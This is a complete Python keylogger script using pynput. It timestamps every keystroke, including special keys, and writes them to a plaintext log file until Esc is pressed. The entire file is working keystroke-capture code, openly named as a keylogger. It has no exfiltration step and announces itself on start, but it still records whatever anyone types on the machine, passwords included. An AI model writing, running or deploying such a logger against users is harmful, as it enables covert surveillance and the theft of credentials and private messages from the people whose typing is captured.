from pynput.keyboard import Listener, Key
import logging

log_file = "keylogs.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')

def format_key(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            return key.char
    except AttributeError:
        pass
    return str(key).strip("'")


def on_press(key):
    formatted_key = format_key(key)
    if key == Key.space:
        logging.info("Space key pressed")
    elif key == Key.enter:
        logging.info("Enter key pressed")
    elif key == Key.backspace:
        logging.info("Backspace key pressed")
    elif isinstance(key, Key):
        logging.info(f"Special key {formatted_key} pressed")
    else:
        logging.info(f"key {formatted_key} pressed")


def on_release(key):
    if key == Key.esc:
        return False
    
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
        
if __name__ == "__main__":
    print("[*] Keylogger started. Press 'Esc' to stop.")
    start_keylogger()
